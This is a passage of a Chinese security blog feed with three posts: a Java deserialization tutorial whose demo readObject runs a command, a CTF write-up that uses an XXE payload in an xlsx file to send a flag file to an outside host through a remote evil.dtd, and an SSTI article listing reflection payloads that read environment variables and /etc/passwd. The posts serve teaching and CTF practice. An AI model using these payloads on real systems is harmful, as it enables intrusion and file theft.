alt="在这里插入图片描述"><br>&emsp;&emsp; 一个新的Gadget的产生构造笔者有几点愚见，如有错误还望海涵。</p><ol><li>一个JDK自带的实现<code>Serializabe</code>接口</li><li>必然离不开Java反射机制</li><li>readObject()方法</li></ol><hr><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://tool.oschina.net/apidocs/apidoc?api=commons-collections" target="_blank" rel="noopener">https://tool.oschina.net/apidocs/apidoc?api=commons-collections</a><br><a href="https://paper.seebug.org/1195/" target="_blank" rel="noopener">https://paper.seebug.org/1195/</a><br><a href="http://blog.orleven.com/2017/11/11/java-deserialize/" target="_blank" rel="noopener">http://blog.orleven.com/2017/11/11/java-deserialize/</a><br><a href="https://xz.aliyun.com/t/7031#toc-5" target="_blank" rel="noopener">https://xz.aliyun.com/t/7031#toc-5</a><br><a href="https://blog.csdn.net/chenwan8737/article/details/100716015" target="_blank" rel="noopener">https://blog.csdn.net/chenwan8737/article/details/100716015</a><br><a href="https://blog.csdn.net/weixin_33802505/article/details/92214760" target="_blank" rel="noopener">https://blog.csdn.net/weixin_33802505/article/details/92214760</a><br><a href="https://blog.csdn.net/21aspnet/article/details/81671777" target="_blank" rel="noopener">https://blog.csdn.net/21aspnet/article/details/81671777</a><br><a href="https://xalan.apache.org/xalan-j/apidocs/index.html" target="_blank" rel="noopener">https://xalan.apache.org/xalan-j/apidocs/index.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;﻿# 前言&lt;/p&gt;
&lt;p&gt;&amp;emsp;&amp;emsp; 如果你没有反序列化的基础，建议你看笔者博客文章先将基础学习一下。如果你没有学习分析过&lt;code&gt;ysoserial--Gadget--URLDNS&lt;/code&gt;，建议你看笔者之前发过的文章学习一下。如果你是大佬，前面当笔者
      
    
    </summary>
    
    
    
      <category term="Java Commons-Collections" scheme="http://yoursite.com/tags/Java-Commons-Collections/"/>
    
  </entry>
  
  <entry>
    <title>漫谈Java反序列化</title>
    <link href="http://yoursite.com/2020/05/20/%E6%BC%AB%E8%B0%88Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <id>http://yoursite.com/2020/05/20/%E6%BC%AB%E8%B0%88Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</id>
    <published>2020-05-20T04:42:16.000Z</published>
    <updated>2020-05-20T08:11:22.281Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>&emsp;&emsp; Java的反序列化漏洞探索出了Java安全的新纪元。开发人员为什么要反序列化呢？众所周知，用户和服务器进行交互时，会传输一下数据，数据传输前需要格式化，将数据转化成服务器认可的格式。比例：<code>JSON</code>、<code>XML</code>。<br>&emsp;&emsp; <code>JSON</code>和<code>XML</code>的优点是兼容性比较强，是通用的数据交互格式。缺点是不支持复杂的数据类型。故开发人员面对需要复杂的数据类型是将数据反序列化，以来达数据交互的目的。<br>&emsp;&emsp;  Java程序在运行时，会产生大量的数据。有些时候，我们需要将内存中的对象信息存储到磁盘或者通过网络发送给第三者，此时，就需要对对象进行序列化操作。当我们需要从磁盘或网络读取存储的信息时，即为反序列化。简单理解，序列化即将内存中的对象信息转换为字节流并存储在磁盘或通过网络发送。反序列化，即从磁盘或网络读取信息，直接转换为内存对象。</p><p>PS: 为避免代码太长而导致的阅读效果，故将完整的实验代码全部已经上传至 <a href="https://github.com/SummerSec/JavaLearnVulnerability" target="_blank" rel="noopener">https://github.com/SummerSec/JavaLearnVulnerability</a></p><hr><h1 id="反序列化demo"><a href="#反序列化demo" class="headerlink" title="反序列化demo"></a>反序列化demo</h1><h2 id="知识补充"><a href="#知识补充" class="headerlink" title="知识补充"></a>知识补充</h2><p><strong>反序列化漏洞基本条件</strong></p><ol><li>Java反序列化类一定要实现<code>Serializabe</code>接口</li><li>所有的Java反序列化漏洞都是用通过<code>readObject()</code>实现</li><li>所有反序列化数据都是要通过<code>writeObject()</code>函数实现<br><img src="https://img-blog.csdnimg.cn/20200517185517421.png" alt="在这里插入图片描述"></li></ol><hr><p><strong>SerialVersionUID</strong><br>&emsp;&emsp; Java的序列化的机制通过判断serialVersionUID来验证版本的一致性。在反序列化的时候与本地的类的serialVersionUID进行比较，一致则可以进行反序列化，不一致则会抛出异常InvalidCastException。IDEA是可以自动生成一个serialVersionUID，需要设置如下。<br><img src="https://img-blog.csdnimg.cn/20200514152044147.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200514153405922.png" alt="在这里插入图片描述"></p><hr><h2 id="案例DEMO"><a href="#案例DEMO" class="headerlink" title="案例DEMO"></a>案例DEMO</h2><p><code>javaSerializableDemo1</code>源码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">javaSerializableDemo1</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line"><span class="comment">// 序列版本ID</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = -<span class="number">1877568378649280904L</span>;</span><br><span class="line">    <span class="keyword">private</span> String username;</span><br><span class="line">    <span class="keyword">private</span> String password;</span><br><span class="line">    <span class="keyword">private</span> Integer age;</span><br><span class="line">    <span class="keyword">private</span> Integer IdCard;</span><br><span class="line">    <span class="keyword">private</span> Date time;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">javaSerializableDemo1</span><span class="params">(String username, String password, Integer age, Integer idCard, Date time)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.username = username;</span><br><span class="line">        <span class="keyword">this</span>.password = password;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">        IdCard = idCard;</span><br><span class="line">        <span class="keyword">this</span>.time = time;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">   <span class="comment">// 省略一部分set、get方法。</span></span><br><span class="line">   </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"javaSerializableDemo&#123;"</span> +</span><br><span class="line">                <span class="string">"username='"</span> + username + <span class="string">'\''</span> +</span><br><span class="line">                <span class="string">", password='"</span> + password + <span class="string">'\''</span> +</span><br><span class="line">                <span class="string">", age="</span> + age +</span><br><span class="line">                <span class="string">", IdCard="</span> + IdCard +</span><br><span class="line">                <span class="string">", time="</span> + time +</span><br><span class="line">                <span class="string">'&#125;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>javaUnSerizableDemo1</code>源码，一般情况下<code>对象写入流writerObject()</code>和<code>对象的输出流readObject</code>是分开实现的。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">javaUnSerializableDemo1</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        javaSerializableDemo1 demo = <span class="keyword">new</span> javaSerializableDemo1(<span class="string">"Summer"</span>,<span class="string">"6666888"</span>,<span class="number">18</span>,<span class="number">666666</span>,<span class="keyword">new</span> Date());</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">"serializable: "</span> + demo);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 将对象写入文件中</span></span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            FileOutputStream fileOutputStream = <span class="keyword">new</span> FileOutputStream(<span class="string">"tempFile.txt"</span>);</span><br><span class="line">            oos = <span class="keyword">new</span> ObjectOutputStream(fileOutputStream);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 序列化</span></span><br><span class="line">            oos.writeObject(demo);</span><br><span class="line"></span><br><span class="line">            oos.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (FileNotFoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 读文件</span></span><br><span class="line">        File file = <span class="keyword">new</span> File(<span class="string">"tempFile.txt"</span>);</span><br><span class="line">        ObjectInputStream ois = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line"></span><br><span class="line">            FileInputStream fileInputStream = <span class="keyword">new</span> FileInputStream(file);</span><br><span class="line">            ois = <span class="keyword">new</span> ObjectInputStream(fileInputStream);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 反序列化</span></span><br><span class="line">            javaSerializableDemo1 newdemo = (javaSerializableDemo1) ois.readObject();</span><br><span class="line">            System.out.println(<span class="string">"unserializable: "</span> + newdemo);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (FileNotFoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/2020051416583311.png" alt="在这里插入图片描述"><br>由于是字节码，直接打开是乱码。<br><img src="https://img-blog.csdnimg.cn/20200514165909506.png" alt="在这里插入图片描述"><br>用vscode插件<code>hexdump</code>查看生成的文件。<br><img src="https://img-blog.csdnimg.cn/20200514170059910.png" alt="在这里插入图片描述"><br>或者使用<code>SerializationDumper.jar</code>工具，效果如下部分截图。<br>下载地址：<a href="https://github.com/NickstaDB/SerializationDumper" target="_blank" rel="noopener">https://github.com/NickstaDB/SerializationDumper</a><br><img src="https://img-blog.csdnimg.cn/2020051417045964.png" alt="在这里插入图片描述"></p><p>&emsp;&emsp; 这个DEMO中实现了笔者前文所提及到的三要素，但似乎你还看不出来漏洞的存在的地方。</p><hr><h2 id="漏洞DEMO"><a href="#漏洞DEMO" class="headerlink" title="漏洞DEMO"></a>漏洞DEMO</h2><p>&emsp;&emsp; 下面会以一个存在的漏洞demo，带你更进一步理解Java反序列化的危害。<br><strong>漏洞源码</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">VulnerabilityClass</span> <span class="keyword">implements</span> <span class="title">summer</span>.<span class="title">serializable</span>.<span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">5550839108669505813L</span>;</span><br><span class="line">    <span class="keyword">private</span> String username;</span><br><span class="line">    <span class="keyword">private</span> String password;</span><br><span class="line">    <span class="keyword">private</span> Date date;</span><br><span class="line"></span><br><span class="line">   </span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(java.io.ObjectInputStream ois)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        ois.defaultReadObject();</span><br><span class="line">        <span class="comment">// 加入执行命令代码</span></span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">"calc"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">VulnerabilityClass</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 省略set、get方法</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"VulnerabilityClass&#123;"</span> +</span><br><span class="line">                <span class="string">"username='"</span> + username + <span class="string">'\''</span> +</span><br><span class="line">                <span class="string">", password='"</span> + password + <span class="string">'\''</span> +</span><br><span class="line">                <span class="string">", date="</span> + date +</span><br><span class="line">                <span class="string">", id="</span> + id +</span><br><span class="line">                <span class="string">'&#125;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">VulnerabilityClass</span><span class="params">(String username, String password, Date date, Integer id)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.username = username;</span><br><span class="line">        <span class="keyword">this</span>.password = password;</span><br><span class="line">        <span class="keyword">this</span>.date = date;</span><br><span class="line">        <span class="keyword">this</span>.id = id;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><strong>漏洞利用</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">       <span class="comment">// 调用序列化方法</span></span><br><span class="line">        Serilizable();</span><br><span class="line">        <span class="comment">// 反序列化方法</span></span><br><span class="line">        UnSerializable();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Serilizable</span><span class="params">()</span></span>&#123;</span><br><span class="line">        VulnerabilityClass clazz = <span class="keyword">new</span> VulnerabilityClass();</span><br><span class="line">        clazz.setDate(<span class="keyword">new</span> Date());</span><br><span class="line">        clazz.setId(<span class="number">1314520</span>);</span><br><span class="line">        clazz.setPassword(<span class="string">"summer6666"</span>);</span><br><span class="line">        clazz.setUsername(<span class="string">"summer"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 写文件</span></span><br><span class="line">        File file = <span class="keyword">new</span> File(<span class="string">"tempFile3"</span>);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(file));</span><br><span class="line">            oos.writeObject(clazz);</span><br><span class="line">            System.out.println(<span class="string">"serilizable: "</span> + clazz);</span><br><span class="line">            oos.close();</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (FileNotFoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">UnSerializable</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        File file = <span class="keyword">new</span> File(<span class="string">"tempFile3"</span>);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(file));</span><br><span class="line">            VulnerabilityClass clazz = (VulnerabilityClass) ois.readObject();</span><br><span class="line">            System.out.println(<span class="string">"unserializable: "</span> + clazz);</span><br><span class="line">            ois.close();</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (FileNotFoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> VulnerabilityClass;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200516145552671.gif" alt="在这里插入图片描述"></p><p><strong>漏洞成因分析</strong></p><p>&emsp;&emsp; 在漏洞源码中的<code>readObject()</code>方法，第一行是默认的反序列化方法<code>defaultReadObject()</code>，但是下面一行是添加了<code>Runtime.getRuntime().exec(&quot;calc&quot;)</code>，虽然这里简单粗暴的将执行命令的代码写入了方法。实际的情况下，开发人员是不会这么做，笔者这里简单展示一下漏洞原理。实际情况都是攻击者通过各种伪造方法、修改、重定义等方法最后到达执行命令。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(java.io.ObjectInputStream ois)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        ois.defaultReadObject();</span><br><span class="line">        <span class="comment">// 加入执行命令代码</span></span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">"calc"</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><hr><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>&emsp;&emsp; 反序列化漏洞三要素实现<code>Serializabe</code>接口、<code>readObject()</code>、<code>writeObject()</code>方法，缺一不可。但试想一下，如果用户控制了<code>readObject</code>亦或者是<code>writeObject</code>方法，那么是不是可以造成反序列化漏洞呢？其实也有一个问题控制不了<code>writeObject</code>方法，因为其在服务器内，或者是Java应用内，我们不可能去修改内部代码。所以说只能通过控制<code>readObject</code>方法，这里的控制得打双引号。问题来了，前人大佬们已经研究出来许多控制方法，经典<code>AnnotationInvocationHandler</code>和<code>BadAttributeValueExpException</code>类均满足条件，下篇文章带你分析。<br>&emsp;&emsp; 如果要深入理解反序列化漏洞可以去学习反序列化利用工具<code>ysoserial</code>。网上很多反序列化文章基本上都是研究<code>commons-collection</code>反序列化，但其实<code>commons-colection</code>反序列化链是很复杂，不建议新手小白学习。<code>ysoserial-Gadget-URLDNS</code>这条反序列化链建议新手小白学习，比较简单。推荐文章<a href="https://samny.blog.csdn.net/article/details/105790987" target="_blank" rel="noopener">小楼昨夜又春风，你知ysoserial-Gadget-URLDNS多少？</a>，这篇文章全方位的解释<code>URLDNS</code>这条链的利用、成因，相对其他作者写的文章分析更加全面，基本上你知道或者不知道都在文章里面。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;&amp;emsp;&amp;emsp; Java的反序列化漏洞探索出了Java安全的新纪元。开发人员为什么要反序列化呢？众所周知，用户和服务器进行交互时，
      
    
    </summary>
    
    
      <category term="代码审计" scheme="http://yoursite.com/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
      <category term="反序列化" scheme="http://yoursite.com/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>2020网鼎杯---Java文件上传wp</title>
    <link href="http://yoursite.com/2020/05/14/2020%E7%BD%91%E9%BC%8E%E6%9D%AF---Java%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0wp/"/>
    <id>http://yoursite.com/2020/05/14/2020%E7%BD%91%E9%BC%8E%E6%9D%AF---Java%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0wp/</id>
    <published>2020-05-14T13:27:45.000Z</published>
    <updated>2020-05-29T06:08:57.330Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p><a href="https://samny.blog.csdn.net/article/details/104426472" target="_blank" rel="noopener">一篇文章读懂Java代码审计之XXE</a>看过我这篇博客应该不难，没看过建议在看看。</p><hr><h1 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h1><p>下载了所有的class发现需要上传xlsx poi<br>开头必须是execl<br><img src="https://img-blog.csdnimg.cn/20200510170315420.png" alt="在这里插入图片描述"></p><ul><li>新建execl</li></ul><p>-1.xlsx文件，修改后缀名execl<br>-1.xlsx.zip解压。<br><img src="https://img-blog.csdnimg.cn/20200510171215395.png" alt="在这里插入图片描述"></p><ul><li><p>修改[Content-Types].xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">ANY</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">file</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"file:///flag"</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">remote</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"http://ip:8089/evil.dtd"</span>&gt;</span></span></span><br><span class="line"><span class="meta">%remote;</span></span><br><span class="line"><span class="meta">%all;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span><span class="symbol">&amp;send;</span><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/2020051518123493.png" alt="在这里插入图片描述"></p></li><li><p>重新打包成<code>excel-1.xlsx</code>，文件名一定不能错。</p></li><li><p>在服务器上新建一个<code>evil.etd</code>文件。<br><img src="https://img-blog.csdnimg.cn/20200510170751751.png" alt="在这里插入图片描述"></p></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % all <span class="string">"&lt;!ENTITY send SYSTEM 'http://ip:8089/%file;'&gt;"</span>&gt;</span><br></pre></td></tr></table></figure><hr><ul><li>然后直接上传，查看服务器http记录。</li></ul><p><img src="https://img-blog.csdnimg.cn/20200510170959142.png" alt="在这里插入图片描述"></p><p><img src="https://img-blog.csdnimg.cn/2020051017050929.png" alt="在这里插入图片描述"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;&lt;a href=&quot;https://samny.blog.csdn.net/article/details/104426472&quot; target
      
    
    </summary>
    
    
    
      <category term="Java 文件上传" scheme="http://yoursite.com/tags/Java-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    
  </entry>
  
  <entry>
    <title>从安全角度谈Java反射机制--终章</title>
    <link href="http://yoursite.com/2020/05/13/%E4%BB%8E%E5%AE%89%E5%85%A8%E8%A7%92%E5%BA%A6%E8%B0%88Java%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6--%E7%BB%88%E7%AB%A0/"/>
    <id>http://yoursite.com/2020/05/13/%E4%BB%8E%E5%AE%89%E5%85%A8%E8%A7%92%E5%BA%A6%E8%B0%88Java%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6--%E7%BB%88%E7%AB%A0/</id>
    <published>2020-05-13T02:42:16.000Z</published>
    <updated>2020-05-13T02:30:57.372Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>首发：<a href="https://www.sec-in.com/article/309" target="_blank" rel="noopener">https://www.sec-in.com/article/309</a><br>&emsp;&emsp; 通过前两章的了解，大家对Java反射机制有了一定的认知。本章作为反射篇的最终章，如果从反序列化的层面来说Java反射的具体危害，需要一些反序列化的基础知识。故笔者决定从反射机制本身来说，它的一个经常被使用的点—Server-Side Template Injection（简称SSTI），中文名服务器端模板注入。</p><hr><h1 id="SSTI"><a href="#SSTI" class="headerlink" title="SSTI"></a>SSTI</h1><p>&emsp;&emsp; 模板引擎被广泛应用于Web应用程序中，通过网页和电子邮件呈现动态数据。将用户输入内容不安全嵌入到模板中，实现服务器端模板注入。SSTI极其容易被误认为是跨站点脚本（XSS），大多数人经常与之擦肩而过。与XSS不同的是，模板注入可以用于直接攻击Web服务器内部，并经常获得远程代码执行（RCE）。模板注入可以通过开发人员的错误配置，通过故意暴露模板，开发人员试图通过来其提供丰富的功能，就像维基、博客、营销应用和内容管理等系统。<br>&emsp;&emsp;先看通用的Java SSTI的payload，payload中的T通常是需要声明的变量，每一个模板引擎都不同。在这里，我们不能发现已经可以看到反射的<code>“影子”</code>了，下面会从每一个模板来具体分析介绍任何使用反射从<code>SSTI</code>到<code>RCE</code>。</p><ol><li>获取系统环境变量<blockquote><p>${T(java.lang.System).getenv()}</p></blockquote></li><li>读取文件内容<blockquote><ul><li>${T(java.lang.Runtime).getRuntime().exec(‘cat etc/passwd’)}</li><li>${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())}</li></ul></blockquote></li></ol><hr><h1 id="Template"><a href="#Template" class="headerlink" title="Template"></a>Template</h1><h2 id="前言-1"><a href="#前言-1" class="headerlink" 